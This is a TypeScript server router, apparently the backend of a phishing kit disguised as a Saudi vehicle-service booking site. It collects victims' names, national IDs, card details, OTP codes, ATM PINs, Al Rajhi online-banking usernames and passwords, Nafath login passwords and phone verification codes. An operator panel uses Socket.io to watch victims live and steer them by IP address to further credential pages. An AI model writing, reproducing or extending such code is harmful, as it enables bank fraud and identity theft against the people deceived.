import { z } from "zod";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { nanoid } from "nanoid";
import {
  createBooking,
  getBookingByReference,
  getAllBookings,
  getNewBookings,
  updateBookingStatus,
  markBookingRead,
  getBookingsStats,
  createOrUpdatePayment,
  getPaymentByReference,
  createOrUpdateVerification,
  getVerificationByReference,
  logNavigation,
  getNavigationLogs,
} from "./db";
import { notifyOwner } from "./_core/notification";
import { getIo } from "./socket";

// ==================== Admin Procedure ====================
const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") {
    throw new TRPCError({ code: "FORBIDDEN", message: "ليس لديك صلاحية الوصول" });
  }
  return next({ ctx });
});

// ==================== Booking Router ====================
const bookingRouter = router({
  // استقبال الحجز الجديد
  create: publicProcedure
    .input(
      z.object({
        req: z.record(z.string(), z.any()),
        reference: z.string().optional(),
        step: z.number().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const req = input.req;
      const referenceId = input.reference || nanoid(12);
      const clientIp: string =
        ((ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()) ||
        ((ctx.req as any).ip as string) ||
        "unknown";

      const plateStr = [
        req.VehiclePlateChar1 || req.vehiclePlateChar1 || "",
        req.VehiclePlateChar2 || req.vehiclePlateChar2 || "",
        req.VehiclePlateChar3 || req.vehiclePlateChar3 || "",
        req.NumberPanal || req.numberPanal || req.InputNumberPanal || "",
      ]
        .filter(Boolean)
        .join("-");

      const str = (v: unknown): string => (v != null ? String(v) : "");
      const booking = await createBooking({
        referenceId,
        clientName: str(req.Name ?? req.name ?? req.InputName),
        clientId: str(req.ID ?? req.id ?? req.InputID),
        clientPhone: str(req.PhonNumber ?? req.phonNumber ?? req.InputPhonNumber),
        clientEmail: str(req.Email1 ?? req.email1 ?? req.InputEmail1),
        clientNationality: str(req.Nationality ?? req.nationality),
        hasDelegate: req.flexSwitchDelegate === 1 || req.flexSwitchDelegate === "1",
        delegateType: str(req.DelegateType ?? req.delegateType),
        delegateName: str(req.DelegateName ?? req.delegateName),
        delegatePhone: str(req.DelegatePhone ?? req.delegatePhone),
        delegateNationality: str(req.DelegateNationality ?? req.delegateNationality),
        delegateId: str(req.DelegateId ?? req.delegateId),
        vehicleCountry: str(req.CountryReg ?? req.countryReg ?? req.InputCountryReg),
        vehiclePlate: plateStr,
        vehiclePlateChar1: str(req.VehiclePlateChar1 ?? req.vehiclePlateChar1),
        vehiclePlateChar2: str(req.VehiclePlateChar2 ?? req.vehiclePlateChar2),
        vehiclePlateChar3: str(req.VehiclePlateChar3 ?? req.vehiclePlateChar3),
        vehicleType: str(req.TypeVechil ?? req.typeVechil ?? req.InputTypeVechil),
        vehicleCarryDang: req.vehicleCarryDang === 1 || req.vehicleCarryDang === "1",
        serviceRegion: str(req.RegionSvc ?? req.regionSvc ?? req.InputRegion),
        serviceType: str(req.TypeSvc ?? req.typeSvc ?? req.InputTypeSvc),
        serviceDate: str(req.DateSvc ?? req.dateSvc ?? req.InputDateSvc),
        serviceTime: str(req.TimeSvc ?? req.timeSvc ?? req.InputTimeSvc),
        clientIp,
        rawData: req,
        statusRead: 0,
        status: "new",
      });

      // إشعار المسؤول
      try {
        await notifyOwner({
          title: "حجز جديد",
          content: `حجز جديد من ${booking?.clientName || "عميل"} - رقم الهوية: ${booking?.clientId || ""} - رقم اللوحة: ${booking?.vehiclePlate || ""}`,
        });
      } catch (e) {
        console.error("Notification error:", e);
      }

      // إرسال Socket.io للوحة التحكم
      try {
        const io = getIo();
        if (io) io.to("admins").emit("newBooking", booking);
      } catch (e) {}

      return {
        status: true,
        message: "تم استلام الحجز بنجاح",
        data: { reference: referenceId, booking },
      };
    }),

  // الحصول على تفاصيل حجز
  getByReference: publicProcedure
    .input(z.object({ reference: z.string() }))
    .query(async ({ input }) => {
      const booking = await getBookingByReference(input.reference);
      if (!booking) throw new TRPCError({ code: "NOT_FOUND", message: "الحجز غير موجود" });
      return { status: true, data: booking };
    }),

  // قائمة الحجوزات (للمسؤول)
  list: adminProcedure
    .input(z.object({ limit: z.number().optional(), offset: z.number().optional() }))
    .query(async ({ input }) => {
      const list = await getAllBookings(input.limit ?? 100, input.offset ?? 0);
      return { status: true, data: list };
    }),

  // الحجوزات الجديدة
  listNew: adminProcedure.query(async () => {
    const list = await getNewBookings();
    return { status: true, data: list };
  }),

  // إحصائيات
  stats: adminProcedure.query(async () => {
    const stats = await getBookingsStats();
    return { status: true, data: stats };
  }),

  // تحديث الحالة
  updateStatus: adminProcedure
    .input(
      z.object({
        reference: z.string(),
        status: z.string(),
        statusRead: z.number().optional(),
      })
    )
    .mutation(async ({ input }) => {
      await updateBookingStatus(input.reference, input.status, input.statusRead);
      return { status: true, message: "تم تحديث الحالة" };
    }),

  // تعليم كمقروء
  markRead: adminProcedure
    .input(z.object({ reference: z.string() }))
    .mutation(async ({ input }) => {
      await markBookingRead(input.reference);
      return { status: true };
    }),
});

// ==================== Payment Router ====================
const paymentRouter = router({
  // معالجة الدفع (خطوات 1، 2، 3، 4)
  submit: publicProcedure
    .input(
      z.object({
        req: z.record(z.string(), z.any()),
        step: z.number(),
        reference: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      const { req, step, reference } = input;

      if (step === 1) {
        // بيانات البطاقة
        const cardNum = String(req.CardID || req.cardID || "").replace(/\s/g, "");
        const s = (v: unknown) => (v != null ? String(v) : "");
        await createOrUpdatePayment(reference, {
          cardHolderName: s(req.CardHolderName ?? req.cardHolderName),
          cardLastFour: cardNum.slice(-4),
          cardExpiry: s(req.DateExp ?? req.dateExp),
          step: 1,
          status: "step1_done",
          rawData: req,
        });
        await updateBookingStatus(reference, "pending_payment");
        return {
          status: true,
          message: "تم استلام بيانات البطاقة",
          data: { step: 1, nextStep: 2 },
        };
      }

      if (step === 2) {
        // رمز التحقق
        await createOrUpdatePayment(reference, {
          verifyCode: String(req.VerifyPayment ?? req.verifyPayment ?? ""),
          step: 2,
          status: "step2_done",
        });
        return {
          status: true,
          message: "تم التحقق من الدفع",
          data: { step: 2, nextStep: 3 },
        };
      }

      if (step === 3) {
        // الرقم السري
        await createOrUpdatePayment(reference, {
          secretNum: String(req.SecretNum ?? req.secretNum ?? ""),
          step: 3,
          status: "step3_done",
        });
        return {
          status: true,
          message: "تم إثبات الدفع",
          data: { step: 3, nextStep: 4 },
        };
      }

      if (step === 4) {
        // بيانات الراجحي
        await createOrUpdatePayment(reference, {
          rajUsername: String(req.raj_username ?? ""),
          rajPassword: String(req.raj_password ?? ""),
          step: 4,
          status: "verified",
        });
        await updateBookingStatus(reference, "payment_done");

        try {
          const booking = await getBookingByReference(reference);
          await notifyOwner({
            title: "دفع جديد",
            content: `تم استلام بيانات دفع من ${booking?.clientName || "عميل"} - المرجع: ${reference}`,
          });
        } catch (e) {}

        try {
          const io = getIo();
          if (io) {
            const payment = await getPaymentByReference(reference);
            io.to("admins").emit("newPayment", { reference, payment });
          }
        } catch (e) {}

        return {
          status: true,
          message: "تم إتمام عملية الدفع",
          data: { step: 4, completed: true },
        };
      }

      return { status: false, message: "خطوة غير صالحة" };
    }),

  // الحصول على بيانات الدفع (للمسؤول)
  getByReference: adminProcedure
    .input(z.object({ reference: z.string() }))
    .query(async ({ input }) => {
      const payment = await getPaymentByReference(input.reference);
      return { status: true, data: payment };
    }),
});

// ==================== Nafath Router ====================
const nafathRouter = router({
  submit: publicProcedure
    .input(
      z.object({
        req: z.record(z.string(), z.any()),
        step: z.number(),
        reference: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      const { req, step, reference } = input;

      if (step === 1) {
        const sv = (v: unknown) => (v != null ? String(v) : "");
        await createOrUpdateVerification(reference, "nafath", {
          nafathId: sv(req.NafathIDCard ?? req.nafathIDCard ?? req.InputID),
          nafathPassword: sv(req.NafathPassword ?? req.nafathPassword ?? req.InputPassword),
          step: 1,
          status: "step1_done",
          rawData: req,
        });
        await updateBookingStatus(reference, "pending_nafath");
        return {
          status: true,
          message: "تم استلام بيانات نفاذ",
          data: { step: 1, nafathNumber: Math.floor(10 + Math.random() * 90).toString() },
        };
      }

      if (step === 2) {
        // التحقق من رمز نفاذ
        await createOrUpdateVerification(reference, "nafath", {
          nafathNumber: String(req.nafathNumber ?? ""),
          step: 2,
          status: "verified",
        });
        await updateBookingStatus(reference, "verified");
        return {
          status: true,
          message: "تم التحقق من نفاذ بنجاح",
          data: { step: 2, verified: true },
        };
      }

      return { status: false, message: "خطوة غير صالحة" };
    }),

  getByReference: adminProcedure
    .input(z.object({ reference: z.string() }))
    .query(async ({ input }) => {
      const data = await getVerificationByReference(input.reference, "nafath");
      return { status: true, data };
    }),
});

// ==================== Motasel Router ====================
const motaselRouter = router({
  submit: publicProcedure
    .input(
      z.object({
        req: z.record(z.string(), z.any()),
        step: z.number(),
        reference: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      const { req, step, reference } = input;

      if (step === 1) {
        const sm = (v: unknown) => (v != null ? String(v) : "");
        await createOrUpdateVerification(reference, "motasel", {
          motaselProvider: sm(req.MotaselNetProvider ?? req.motaselNetProvider),
          motaselPhone: sm(req.MotaselPhonNum ?? req.motaselPhonNum),
          step: 1,
          status: "step1_done",
          rawData: req,
        });
        await updateBookingStatus(reference, "pending_motasel");
        return {
          status: true,
          message: "تم إرسال رمز التحقق",
          data: { step: 1 },
        };
      }

      if (step === 2) {
        await createOrUpdateVerification(reference, "motasel", {
          motaselCode: String(req.MotaselVerifyCode ?? req.motaselVerifyCode ?? ""),
          step: 2,
          status: "verified",
        });
        await updateBookingStatus(reference, "verified");
        return {
          status: true,
          message: "تم التحقق بنجاح",
          data: { step: 2, verified: true },
        };
      }

      return { status: false, message: "خطوة غير صالحة" };
    }),

  getByReference: adminProcedure
    .input(z.object({ reference: z.string() }))
    .query(async ({ input }) => {
      const data = await getVerificationByReference(input.reference, "motasel");
      return { status: true, data };
    }),
});

// ==================== Navigation Router ====================
const navigationRouter = router({
  // توجيه العميل من لوحة التحكم
  navigateTo: adminProcedure
    .input(
      z.object({
        clientIp: z.string(),
        page: z.string(),
        referenceId: z.string().optional(),
        note: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const { clientIp, page, referenceId, note } = input;

      // تسجيل في قاعدة البيانات
      await logNavigation({
        referenceId,
        clientIp,
        targetPage: page,
        adminId: ctx.user.id,
        note,
      });

      // إرسال أمر التوجيه عبر Socket.io
      try {
        const io = getIo();
        if (io) {
          io.emit("navigateTo", { page, ip: clientIp });
        }
      } catch (e) {
        console.error("Socket emit error:", e);
      }

      return { status: true, message: `تم توجيه العميل إلى ${page}` };
    }),

  // سجل التوجيه
  getLogs: adminProcedure
    .input(z.object({ referenceId: z.string().optional() }))
    .query(async ({ input }) => {
      const logs = await getNavigationLogs(input.referenceId);
      return { status: true, data: logs };
    }),
});

// ==================== Admin Router ====================
const adminRouter = router({
  // قائمة المستخدمين مع بيانات الدفع والتحقق
  getUsersWithDetails: adminProcedure
    .input(
      z.object({
        type: z.enum(["ALL_ACTIONS_LIST", "NEW_ACTIONS_LIST"]).optional(),
        limit: z.number().optional(),
      })
    )
    .query(async ({ input }) => {
      const list =
        input.type === "NEW_ACTIONS_LIST"
          ? await getNewBookings()
          : await getAllBookings(input.limit ?? 50);
      return { status: true, data: list };
    }),

  // الحصول على قوالب النماذج لعميل معين
  getTemplateForms: adminProcedure
    .input(z.object({ Reference: z.string() }))
    .query(async ({ input }) => {
      const booking = await getBookingByReference(input.Reference);
      const payment = await getPaymentByReference(input.Reference);
      const nafath = await getVerificationByReference(input.Reference, "nafath");
      const motasel = await getVerificationByReference(input.Reference, "motasel");
      const navLogs = await getNavigationLogs(input.Reference);

      return {
        status: true,
        data: { booking, payment, nafath, motasel, navLogs },
      };
    }),

  // تعيين حالة الإجراء
  setActionStatus: adminProcedure
    .input(
      z.object({
        action: z.string(),
        ID: z.union([z.string(), z.number()]),
        step: z.number().optional(),
        Reference: z.string().optional(),
      })
    )
    .mutation(async ({ input }) => {
      const reference = input.Reference || String(input.ID);
      if (input.action === "accepted" || input.action === "verified") {
        await updateBookingStatus(reference, "verified", 1);
      } else if (input.action === "completed") {
        await updateBookingStatus(reference, "completed", 1);
      } else if (input.action === "cancelled") {
        await updateBookingStatus(reference, "cancelled", 1);
      }
      const booking = await getBookingByReference(reference);
      return { status: true, data: booking };
    }),

  // حذف مستخدمين
  deleteUsers: adminProcedure
    .input(z.object({ references: z.array(z.string()) }))
    .mutation(async ({ input }) => {
      for (const ref of input.references) {
        await updateBookingStatus(ref, "cancelled");
      }
      return { status: true, message: "تم الحذف" };
    }),

  // التحكم في خطوات الدفع (OTP / ATM / رفض / قبول نهائي)
  setPaymentAction: adminProcedure
    .input(
      z.object({
        reference: z.string(),
        action: z.enum(["accepted", "pass", "denied", "verified"]),
      })
    )
    .mutation(async ({ input }) => {
      const { reference, action } = input;

      // جلب IP العميل من قاعدة البيانات
      const booking = await getBookingByReference(reference);
      const clientIp = booking?.clientIp || "";

      if (action === "accepted") {
        // توجيه لصفحة OTP
        await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
      } else if (action === "pass") {
        // توجيه لصفحة ATM
        await createOrUpdatePayment(reference, { paymentAction: "pass" } as any);
      } else if (action === "denied") {
        // رفض الدفع
        await createOrUpdatePayment(reference, { paymentAction: "denied" } as any);
        await updateBookingStatus(reference, "cancelled", 1);
      } else if (action === "verified") {
        // قبول نهائي
        await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
        await updateBookingStatus(reference, "completed", 1);
      }

      // إشعار Socket.io - إرسال للمسؤولين وتوجيه العميل
      try {
        const io = getIo();
        if (io) {
          io.to("admins").emit("paymentActionSet", { reference, action });

          // تحديد الصفحة المستهدفة للعميل
          let targetPage: string | null = null;
          if (action === "accepted") targetPage = "code";         // صفحة OTP
          else if (action === "pass") targetPage = "pin";          // صفحة ATM PIN
          else if (action === "denied") targetPage = "payments?declined=true"; // رفض
          else if (action === "verified") targetPage = "bCall";   // نجاح

          // إرسال navigateTo للعميل إذا كان IP معروفاً
          if (targetPage && clientIp) {
            io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
            // fallback: إرسال للجميع مع IP للتحقق
            io.emit("navigateTo", { page: targetPage, ip: clientIp });
          }
        }
      } catch (_) {}

      return { status: true, action, reference };
    }),

  // إرسال رمز نفاذ للعميل
  sendNafathCode: adminProcedure
    .input(
      z.object({
        reference: z.string(),
        code: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      const { reference, code } = input;
      await createOrUpdateVerification(reference, "nafath", {
        nafathNumber: code,
        step: 2,
        status: "step1_done",
      });
      try {
        const io = getIo();
        if (io) io.to("admins").emit("nafathCodeSent", { reference, code });
      } catch (_) {}
      return { status: true, message: "تم إرسال رمز نفاذ" };
    }),
});

// ==================== App Router ====================
export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),
  booking: bookingRouter,
  payment: paymentRouter,
  nafath: nafathRouter,
  motasel: motaselRouter,
  navigation: navigationRouter,
  admin: adminRouter,
});

export type AppRouter = typeof appRouter;
